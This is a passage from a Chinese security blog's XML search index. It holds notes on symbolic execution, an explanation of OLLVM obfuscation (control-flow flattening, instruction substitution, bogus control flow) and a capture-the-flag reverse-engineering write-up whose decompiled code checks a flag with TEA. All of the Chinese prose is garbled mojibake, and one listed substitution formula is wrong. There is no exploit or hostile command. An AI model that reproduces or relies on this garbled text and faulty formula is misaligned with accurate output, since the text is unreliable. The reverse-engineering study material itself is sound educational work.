å°„ï¼š$\sigma$={var$\rightarrow$$\lambda_0$,$var_2$$\rightarrow$$\lambda_0$+7}</li><li>å½“é‡åˆ°æ¡ä»¶è¯­å¥if(e) a else b.PCä¼šå…ˆæ›´æ–°ä¸ºPC$\land$$\sigma$(e)è¡¨ç¤ºthen,ç„¶ååˆ›å»ºPC$^`$åˆå§‹åŒ–ä¸ºPC$\neg$$\land\sigma$(e)è¡¨ç¤ºå¦ä¸€æ¡è·¯å¾„</li><li>å¦‚æœé‡åˆ°exitï¼Œé”™è¯¯ï¼Œå‰åçº¦æŸçŸ›ç›¾ï¼Œè¿™ä¸€ä¸ªè·¯å¾„ä¼šç»ˆæ­¢ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> å·¥å…· </category>
          
          <category> ç¬¦å·æ‰§è¡Œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> æ¦‚å¿µ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ollvmä»£ç æ··æ·†</title>
      <link href="/posts/f1101757.html"/>
      <url>/posts/f1101757.html</url>
      
        <content type="html"><![CDATA[<h1>ç¼–è¯‘å™¨</h1><h2 id="æ¦‚å¿µ">æ¦‚å¿µ</h2><p><code>å°†é«˜çº§è¯­è¨€ç¼–å†™çš„ç¨‹åºè½¬æ¢ä½ç›®æ ‡è¯­è¨€(é€šå¸¸æ˜¯æœºå™¨è¯­è¨€)çš„ç¨‹åºå«åšç¼–è¯‘å™¨.</code>è¿™ä¸ªè½¬æ¢çš„è¿‡ç¨‹å«ç¼–è¯‘.ä¸åŒäºåœ¨æ‰§è¡Œè§£é‡Šæ€§è¯­è¨€è§£é‡Šå™¨æ€»å­˜åœ¨ä¸”é€è¡Œè§£é‡Š,ç¼–è¯‘å™¨ä¸€æ¬¡æ€§æŠŠæ•´ä¸ªç¨‹åºç¼–è¯‘æˆäºŒè¿›åˆ¶ä»£ç ä»è€Œä¸€èˆ¬æƒ…å†µè¿è¡Œæ›´å¿«.ä½†æ˜¯ç”±äºè§£é‡Šå™¨å¯ä»¥åœ¨ä¸åŒå¹³å°ä¸Šè¿ä½œ,å…¼å®¹æ€§,è·¨å¹³å°æ€§æ›´å¼º.</p><h2 id="ç¼–è¯‘å™¨æ„æˆ">ç¼–è¯‘å™¨æ„æˆ</h2><p>ä¼ ç»Ÿçš„ç¼–è¯‘å™¨æ„æˆå¸¸åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:å‰ç«¯,ä¼˜åŒ–å™¨,åç«¯.ç¼–è¯‘è¿‡ç¨‹ä¸­,å‰ç«¯è´Ÿè´£è¯­æ³•åˆ†æ,å°†æºä»£ç è½¬ä¸ºå…¶é«˜çº§å½¢å¼:æŠ½è±¡è¯­æ³•æ ‘(å³æŠŠæºä»£ç çš„å­—ç¬¦ä¸²è½¬ä¸ºå†…å­˜ä¸­æœ‰æ„ä¹‰çš„æ•°æ®);ä¼˜åŒ–å™¨å°†ç»è¿‡å‰ç«¯å¤„ç†çš„ä¸­é—´ä»£ç è¿›è¡Œä¼˜åŒ–;åç«¯å°†ä¼˜åŒ–åçš„ä¸­é—´ä»£ç è½¬æ¢ä¸ºå¯¹åº”çš„æ±‡ç¼–è¯­è¨€.</p><h2 id="ä¸»è¦ç¼–è¯‘å™¨">ä¸»è¦ç¼–è¯‘å™¨</h2><h3 id="GCC">GCC</h3><blockquote><p>GCCï¼ˆGNU Compiler Collectionï¼ŒGNU ç¼–è¯‘å™¨å¥—è£…ï¼‰ï¼Œæ˜¯ä¸€å¥—ç”± GNU å¼€å‘çš„ç¼–ç¨‹è¯­è¨€ç¼–è¯‘å™¨ã€‚GCC åŸåä¸º GNU C è¯­è¨€ç¼–è¯‘å™¨ï¼Œå› ä¸ºå®ƒåŸæœ¬åªèƒ½å¤„ç† Cè¯­è¨€ã€‚GCC å¿«é€Ÿæ¼”è¿›ï¼Œå˜å¾—å¯å¤„ç† C++ã€Fortranã€Pascalã€Objective-Cã€Java ä»¥åŠ Ada ç­‰ä»–è¯­è¨€ã€‚</p></blockquote><h3 id="LLVM">LLVM</h3><blockquote><p>LLVM ï¼ˆLow Level Virtual Machineï¼Œåº•å±‚è™šæ‹Ÿæœº)ï¼‰æä¾›äº†ä¸ç¼–è¯‘å™¨ç›¸å…³çš„æ”¯æŒï¼Œèƒ½å¤Ÿè¿›è¡Œç¨‹åºè¯­è¨€çš„ç¼–è¯‘æœŸä¼˜åŒ–ã€é“¾æ¥ä¼˜åŒ–ã€åœ¨çº¿ç¼–è¯‘ä¼˜åŒ–ã€ä»£ç ç”Ÿæˆã€‚ç®€è€Œè¨€ä¹‹ï¼Œå¯ä»¥ä½œä¸ºå¤šç§ç¼–è¯‘å™¨çš„åå°æ¥ä½¿ç”¨ã€‚</p><p>è‹¹æœå…¬å¸ä¸€ç›´ä½¿ç”¨ GCC ä½œä¸ºå®˜æ–¹çš„ç¼–è¯‘å™¨ã€‚GCC ä½œä¸ºä¸€æ¬¾å¼€æºçš„ç¼–è¯‘å™¨ï¼Œä¸€ç›´åšå¾—ä¸é”™ï¼Œä½† Apple å¯¹ç¼–è¯‘å·¥å…·ä¼šæå‡ºæ›´é«˜çš„è¦æ±‚ã€‚åŸå› ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><p>å…¶ä¸€ï¼Œæ˜¯ Apple å¯¹ Objective-C è¯­è¨€ï¼ˆåŒ…æ‹¬åæ¥å¯¹ C è¯­è¨€ï¼‰æ–°å¢å¾ˆå¤šç‰¹æ€§ï¼Œä½† GCC å¼€å‘è€…å¹¶ä¸ä¹° Apple çš„è´¦â€”â€”ä¸ç»™å®ç°ï¼Œå› æ­¤ç´¢æ€§åæ¥ä¸¤è€…åˆ†æˆä¸¤æ¡åˆ†æ”¯åˆ†åˆ«å¼€å‘ï¼Œè¿™ä¹Ÿé€ æˆ Apple çš„ç¼–è¯‘å™¨ç‰ˆæœ¬è¿œè½åäº GCC çš„å®˜æ–¹ç‰ˆæœ¬ã€‚</p><p>å…¶äºŒï¼ŒGCC çš„ä»£ç è€¦åˆåº¦å¤ªé«˜ï¼Œå¾ˆéš¾ç‹¬ç«‹ï¼Œè€Œä¸”è¶Šæ˜¯åæœŸçš„ç‰ˆæœ¬ï¼Œä»£ç è´¨é‡è¶Šå·®ï¼Œä½† Apple æƒ³åšçš„å¾ˆå¤šåŠŸèƒ½ï¼ˆæ¯”å¦‚æ›´å¥½çš„ IDE æ”¯æŒï¼‰ï¼Œéœ€è¦æ¨¡å—åŒ–çš„æ–¹å¼æ¥è°ƒç”¨ GCCï¼Œä½† GCCä¸€ç›´ä¸ç»™åšã€‚</p></blockquote><p>è¯¥ç¼–è¯‘å™¨çš„ç‰¹æ®Šç‚¹åœ¨äºä¸­é—´è¡¨ç¤º(IR).è¿™æ˜¯å‰ç«¯å°†æºä»£ç ç”Ÿæˆä¸ºä¸€ç§ç±»æœºå™¨ç (å„å¹³å°ä¸åŒ),å¹¶å¯ä»¥ç”±LLVMåç«¯è§£æçš„ä»£ç .ç”¨ä»¥æ‰©å±•è§£é‡Šå™¨çš„è·¨å¹³å°æ€§.æ­¤å‰,ä¸€èˆ¬æ˜¯æŠŠæºä»£ç ç¼–è¯‘æˆCä»£ç ç„¶åäº¤ç”±å¯¹åº”å¹³å°çš„Cç¼–è¯‘å™¨ç¼–è¯‘æˆäºŒè¿›åˆ¶æ–‡ä»¶(å› ä¸ºä¸€èˆ¬å¹³å°éƒ½æœ‰Cç¼–è¯‘å™¨).åœ¨LLVMä¸­,åªéœ€è¦æŠŠæºæ–‡ä»¶ç¼–è¯‘æˆIRç„¶åäº¤ç”±LLVMåç«¯ç›´æ¥ç¼–è¯‘åˆ°å¯¹åº”å¹³å°.</p><h3 id="CLANG">CLANG</h3><p>Clang æ˜¯ LLVM çš„å‰ç«¯,äºLLVMçš„åç«¯ç»„åˆå¯ä»¥å½“ä½œå¦ä¸€ä¸ªç¼–è¯‘å™¨,Clangæ˜¯Appleç ”å‘çš„å‰ç«¯æ—¨åœ¨ä»£æ›¿GCCçš„å‰ç«¯</p><hr><h1>OLLVM</h1><p>åœ¨LLVMåŸºç¡€ä¸Š,Obfuscator-LLVMé¡¹ç›®è¢«ç ”å‘äº†å‡ºæ¥,é€šè¿‡ä¸‰ç§æ··æ·†Pass(æ¨¡å—)å®Œå–„ä»£ç çš„å®‰å…¨æ€§.</p><ul><li>æ§åˆ¶æµå¹³å¦åŒ–</li><li>æŒ‡ä»¤æ›¿æ¢</li><li>ä¼ªé€ æ§åˆ¶æµ(åˆå«æ··æ·†æ§åˆ¶æµ)</li></ul><p>æ··æ·†Passä½œç”¨äºIR,é€šè¿‡æ··æ·†IRä½¿åç«¯è½¬æ¢çš„æ–‡ä»¶è¢«æ··æ·†,ä½¿é€†å‘éš¾åº¦å¢å¤§.</p><h2 id="æ§åˆ¶æµå¹³å¦åŒ–">æ§åˆ¶æµå¹³å¦åŒ–</h2><p><img src="https://s2.loli.net/2023/12/21/RahxKGqA8B5OnCr.png" alt="104308x4cppkp5zjsfl8zy"></p><p>ä»£ç æœ¬èº«æ˜¯çœŸå®å—å’Œretnå—çš„ç»„åˆ,åœ¨è¿›è¡Œæ§åˆ¶æµå¹³å¦åŒ–ä¹‹å,ç¨‹åºçš„æµç¨‹è¢«åˆ†å‘å™¨æ§åˆ¶,æ‰€æœ‰çœŸå®å—æœ€åè¿›è¡Œå¯¹æ ‡è®°çš„å¤„ç†ç„¶åå…¨éƒ¨è¿›å…¥é¢„å¤„ç†å™¨,æ ¹æ®æ ‡è®°çš„å€¼ä¸åŒç”±ä¸»åˆ†å‘å™¨åˆ†å‘åˆ°å‰¯åˆ†å‘å™¨å†åˆ°çœŸå®å—,ä»è€Œæ··æ·†äº†æ•´ä¸ªæ‰§è¡Œæµç¨‹,åœ¨åæ±‡ç¼–è§†å›¾ä¸­çš„ç‰¹å¾æ˜¯æœ‰å¾ˆå¤šwhileå¾ªç¯åœ¨åé¢æœ‰switch caseè¯­å¥.(ä»¥æˆ‘çš„æ°´å¹³æ¥çœ‹,æ§åˆ¶æµå¹³å¦åŒ–ä¹‹åå‡ ä¹ä¸å¯è¯»)</p><h3 id="ç‰¹å¾">ç‰¹å¾</h3><p>åŸå§‹çš„æ¡ä»¶ä¸€èˆ¬ä¼šè½¬åŒ–ä¸ºCMOVæ¡ä»¶ä¼ é€æŒ‡ä»¤,æ ¹æ®æ¯”è¾ƒç»“æœè®¾ç½®æ ‡è®°çš„å€¼</p><h2 id="æŒ‡ä»¤æ›¿æ¢">æŒ‡ä»¤æ›¿æ¢</h2><p>ç”¨å¤šä¸ªè¡¨è¾¾å¼æ›¿æ¢ä¸€ä¸ªè®¡ç®—è¡¨è¾¾å¼</p><h3 id="ç‰¹å¾-2">ç‰¹å¾</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">åŸå¼å­ï¼š</span><br><span class="line">a=b+c</span><br><span class="line">æ··æ·†åï¼š</span><br><span class="line">a = b - (-c)</span><br><span class="line">a = -(-b + (-c))</span><br><span class="line">r = rand (); a = b + r; a = a + c; a = a - r</span><br><span class="line">r = rand (); a = b - r; a = a + b; a = a + r</span><br><span class="line"></span><br><span class="line">åŸå¼å­ï¼š</span><br><span class="line">a = b-c</span><br><span class="line">æ··æ·†åï¼š</span><br><span class="line">a = b + (-c)</span><br><span class="line">r = rand (); a = b + r; a = a - c; a = a - r</span><br><span class="line">r = rand (); a = b - r; a = a - c; a = a + r</span><br><span class="line"></span><br><span class="line">åŸæŒ‡ä»¤ï¼š</span><br><span class="line">a = b &amp; c</span><br><span class="line">æ··æ·†åï¼š</span><br><span class="line">a = (b ^ ~c) &amp; b</span><br><span class="line">a = ~(~a | ~b) &amp; (r | ~r)</span><br><span class="line"></span><br><span class="line">åŸæŒ‡ä»¤ï¼š</span><br><span class="line">a = b | c</span><br><span class="line">æ··æ·†åï¼š</span><br><span class="line">a = (b &amp; c) | (b ^ c)</span><br><span class="line">a = (((~a &amp; r) | (a &amp; ~r)) ^ ((~b &amp; r) | (b &amp; ~r))) | (~(~a | ~b) &amp; (r | ~r))</span><br><span class="line"></span><br><span class="line">åŸæŒ‡ä»¤ï¼š</span><br><span class="line">a = a ^ b</span><br><span class="line">æ··æ·†åï¼š</span><br><span class="line">a = (~a &amp; b) | (a &amp; ~b)</span><br><span class="line">a = ((~a &amp; r) | (a &amp; ~r)) ^ ((~b &amp; r) | (b &amp; ~r))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><img src="https://ask.qcloudimg.com/http-save/yehe-8150619/9571bfa62d17b52593dff42fa4bd9a47.png" alt="[IDA F5 å¢å¼ºæ’ä»¶ï¼Œè¿˜æˆ‘æºä»£ç ï¼ˆä¸€ï¼‰-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)](https://cloud.tencent.com/developer/article/1845335)" /><h2 id="ä¼ªé€ æ§åˆ¶æµ">ä¼ªé€ æ§åˆ¶æµ</h2><p>ä¼ªé€ æ§åˆ¶æµæ˜¯åœ¨ä¸€å¼€å§‹è®¾ç½®ä¸€ä¸ªå˜é‡/è¡¨è¾¾å¼,è¿™ä¸ªå˜é‡/è¡¨è¾¾å¼è¢«ç§°ä¸º<code>ä¸é€æ˜è°“è¯</code>,å¹¶ä¸ºæ¯ä¸€ä¸ªåŸºæœ¬å—ç”Ÿæˆä¸€ä¸ªåƒåœ¾æŒ‡ä»¤å—,é€šè¿‡ä¸é€æ˜è°“è¯è¿›è¡Œè·³è½¬åˆ°ä¸åŒä½ç½®,ä½†æ˜¯å®é™…ä¸Šä¸ä¼šåˆ°è¾¾åƒåœ¾æŒ‡ä»¤å—å¤„.</p><h3 id="ç‰¹å¾å›¾">ç‰¹å¾å›¾</h3><img src="http://image.3001.net/images/20170323/14902545615701.png!small" alt="6.png" style="zoom:67%;" /><hr><h2 id="å¯¹äºåˆå­¦è€…çš„é€†å‘æ–¹æ³•">å¯¹äºåˆå­¦è€…çš„é€†å‘æ–¹æ³•</h2><p>ä¼ªé€ æ§åˆ¶æµ:è§<a href="https://zhuanlan.zhihu.com/p/151853593">Hex-Rays: åæ­¥æ€ä¸€äººï¼Œä¸¤æ­¥ç§’OLLVM-BCF(zhihu.com)</a></p><p>æ§åˆ¶æµå¹³å¦åŒ–å’Œä¼ªé€ æ§åˆ¶æµ:è§<a href="https://github.com/pcy190/deflat">pcy190/deflat: Use angr to deflat the flat control flow. (github.com)</a></p><p>æŒ‡ä»¤æ›¿æ¢:è§<a href="https://github.com/joydo/d810">joydo/d810 (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> åé™æ€åˆ†æ </category>
          
          <category> ä»£ç æ··æ·† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> ç¼–è¯‘å™¨ </tag>
            
            <tag> æ··æ·† </tag>
            
            <tag> åæ··æ·† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€é“é¢˜</title>
      <link href="/posts/2480ed19.html"/>
      <url>/posts/2480ed19.html</url>
      
        <content type="html"><![CDATA[<div class="note info flat"><p>info æœ¬ç¯‡æ˜¯ä¸ºäº†å¤ç°äº†å½“æ—¶åšé¢˜çš„æ­¥éª¤æ€»ç»“ç»éªŒï¼Œæ‰€ä»¥ä¼šå†™çš„æ¯”è¾ƒè¯¦ç»†ã€‚å¦‚æœæ‚¨æ°´å¹³è¾ƒé«˜ï¼Œåªæƒ³çœ‹çŸ¥è¯†ç‚¹å¯ä»¥ç›´æ¥è·³åˆ°åé¢é˜²æ­¢è¢«æ°”åˆ°è„‘æº¢è¡€ã€‚åŒæ—¶æœ¬ç¯‡å†…å®¹æœ‰é”™è¯¯çš„åœ°æ–¹ä¹Ÿè¯·åœ¨è¯„è®ºåŒºæŒ‡å‡º,æ„Ÿè°¢</p></div><details class="folding-tag" green><summary> ä¸é‡è¦çš„å‰è¨€ </summary>              <div class='content'>              <p>è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å‚åŠ å¼ºç½‘æ¯ï¼Œä½†æ˜¯ä¸€é“é¢˜éƒ½æ²¡åšå‡ºæ¥ï¼Œçœ‹æ¥è¿˜æ˜¯è¦ç»§ç»­å­¦ä¹ å•Šï¼ä¸¤å¤©å•Šä¸¤å¤©ï¼Œæˆ‘ä¸€å¼€å§‹ä»¥ä¸ºæˆ‘å¯ä»¥è§£å‡ºæ¥ï¼Œä½†æ˜¯å¤±è´¥äº†ã€‚åæ¥ç»è¿‡è¯¢é—®å’Œæ€è€ƒç»ˆäºçŸ¥é“é”™åœ¨å“ªé‡Œäº†ï¼Œæ‰€ä»¥å†™ä¸€ç¯‡è®°å½•ä¸€ä¸‹è§£é¢˜è¿‡ç¨‹å’ŒçŸ¥è¯†ç‚¹ã€‚</p>              </div>            </details><p>é‚£ä¹ˆå¼€å§‹å§ï¼</p><h2 id="æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯">æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯</h2><p><img src="https://s2.loli.net/2023/12/18/X9RCPSe2fQFygKq.png" alt="image-20231218091226849"></p><p>è¿™ä¸€æ­¥æ˜¯ä½¿ç”¨å·¥å…·å¯¹æ–‡ä»¶å¤´éƒ¨è¿›è¡Œåˆ†æï¼Œæ‰¾å‡ºè¯¥æ–‡ä»¶çš„åŸºæœ¬æ–‡ä»¶ç±»å‹ï¼Œä¸ºåé¢çš„åç¼–è¯‘åˆ†ææä¾›ä¾¿åˆ©ã€‚</p><p>æ ¹æ®DIEçš„ä¿¡æ¯ï¼š</p><ol><li>æ™®é€š64ä½PEæ–‡ä»¶</li><li>Cæˆ–C++</li><li>æ²¡æœ‰åŠ å£³</li><li>æ³¨æ„åœ¨èŠ‚åŒºä¸€è¡Œï¼Œæœ‰TLSå­—æ ·æ˜¯äº®çš„ï¼Œè¯´æ˜æœ‰TLSèŠ‚(å½“æ—¶æ²¡æ³¨æ„)</li></ol><hr><h2 id="æ‰“å¼€æ–‡ä»¶è·å–æ˜æ˜¾ä¿¡æ¯">æ‰“å¼€æ–‡ä»¶è·å–æ˜æ˜¾ä¿¡æ¯</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ­å–œä½ è¿›å…¥äº†ä¸»å‡½æ•°é‡Œ</span><br><span class="line">Please input your key:</span><br><span class="line"><span class="comment">//è¾“å…¥ä»»æ„å†…å®¹åè‡ªåŠ¨é€€å‡º</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ­¥å¸®åŠ©æˆ‘ä»¬å®šä½å…³é”®ä»£ç </p><hr><h2 id="åç¼–è¯‘å™¨ç¼–è¯‘æŸ¥çœ‹æºä»£ç ">åç¼–è¯‘å™¨ç¼–è¯‘æŸ¥çœ‹æºä»£ç </h2><details class="folding-tag" ><summary> åŒ–ç®€åçš„ä¸»å‡½æ•°ä»£ç  </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  _DWORD Q[<span class="number">15</span>]; <span class="comment">// [rsp+28h] [rbp+8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> k; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">34</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">0xCCCCCCCC</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  j___CheckForDebuggerJustMyCode((__int64)&amp;byte_7FF71EE840F4, (__int64)argv);</span><br><span class="line">  sub_7FF71EE711A9(byte_7FF71EE7AD78);</span><br><span class="line">  sub_7FF71EE7123F((__int64)aPleaseInputYou);</span><br><span class="line">  <span class="built_in">std</span>::istream::getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, flag, <span class="number">33</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( j_strlen(flag) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(Q, <span class="number">0</span>, <span class="number">0x20</span>ui64);</span><br><span class="line">    bToD(Q, flag);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">      TEA(&amp;Q[<span class="number">2</span> * j], &amp;Q[<span class="number">2</span> * j + <span class="number">1</span>]);</span><br><span class="line">    dToB(Q, last);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; (<span class="type">int</span>)k &lt; <span class="number">32</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( check[k] != last[k] )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_7FF71EE7123F((__int64)aNoNoNo);</span><br><span class="line">        sub_7FF71EE711A9(<span class="string">&quot;%d&quot;</span>, k);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_7FF71EE7123F((__int64)aYes);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF71EE711A9(<span class="string">&quot;Wrong Length!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><p>å¤§è‡´åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š</p><ol><li>è¯»å…¥flag</li><li>æ ¡éªŒflag</li><li>è¾“å‡º</li></ol><div class="tabs" id="mainå‡½æ•°åˆ†æ"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#mainå‡½æ•°åˆ†æ-1">è¯»å…¥flag</button></li><li class="tab"><button type="button" data-href="#mainå‡½æ•°åˆ†æ-2">æ ¡éªŒflag</button></li><li class="tab"><button type="button" data-href="#mainå‡½æ•°åˆ†æ-3">è¾“å‡º</button></li><li class="tab"><button type="button" data-href="#mainå‡½æ•°åˆ†æ-4">å…¶å®ƒ</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="mainå‡½æ•°åˆ†æ-1"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub_7FF71EE711A9(byte_7FF71EE7AD78);</span><br><span class="line">sub_7FF71EE7123F((__int64)aPleaseInputYou);</span><br><span class="line"><span class="built_in">std</span>::istream::getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, flag, <span class="number">33</span>i64);</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="mainå‡½æ•°åˆ†æ-2"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( j_strlen(flag) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(Q, <span class="number">0</span>, <span class="number">0x20</span>ui64);</span><br><span class="line">    bToD(Q, flag);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">      TEA(&amp;Q[<span class="number">2</span> * j], &amp;Q[<span class="number">2</span> * j + <span class="number">1</span>]);</span><br><span class="line">    dToB(Q, last);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">32</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( check[k] != last[k] )</span><br><span class="line">      &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="mainå‡½æ•°åˆ†æ-3"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sub_7FF71EE7123F((__int64)aNoNoNo);</span><br><span class="line">sub_7FF71EE711A9(<span class="string">&quot;%d&quot;</span>, k);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">    sub_7FF71EE7123F((__int64)aYes);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF71EE711A9(<span class="string">&quot;Wrong Length!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="mainå‡½æ•°åˆ†æ-4"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v3 = &amp;v5;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">34</span>i64; i; --i )</span><br><span class="line">&#123;</span><br><span class="line">  *(_DWORD *)v3 = <span class="number">0xCCCCCCCC</span>;</span><br><span class="line">  v3 += <span class="number">4</span>;</span><br><span class="line">&#125;<span class="comment">//çœ‹èµ·æ¥æ²¡æœ‰æ„ä¹‰ï¼Œåœ¨ä¸€å¼€å§‹åˆå§‹åŒ–å†…å­˜</span></span><br><span class="line">j___CheckForDebuggerJustMyCode((__int64)&amp;byte_7FF71EE840F4, (__int64)argv);<span class="comment">//çœ‹åå­—æ˜¯åè°ƒè¯•</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><hr><p>è¯»å…¥å’Œè¾“å‡ºéƒ¨åˆ†æ²¡ä»€ä¹ˆå¥½åˆ†æçš„ï¼Œä¸»è¦æ˜¯æ£€éªŒflagéƒ¨åˆ†ï¼Œä½†æ˜¯å…ˆè¯•è¯•å¯ä¸å¯ä»¥è°ƒè¯•ï¼Œå°è¯•ä¹‹åæœç„¶ä¸å¯ä»¥ã€‚é‚£ä¹ˆå¼€å§‹åˆ†ææ£€éªŒflagéƒ¨åˆ†ï¼š</p><div class="tabs" id="æ ¡éªŒéƒ¨åˆ†--1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#æ ¡éªŒéƒ¨åˆ†--1-1">é•¿åº¦æ£€éªŒ</button></li><li class="tab"><button type="button" 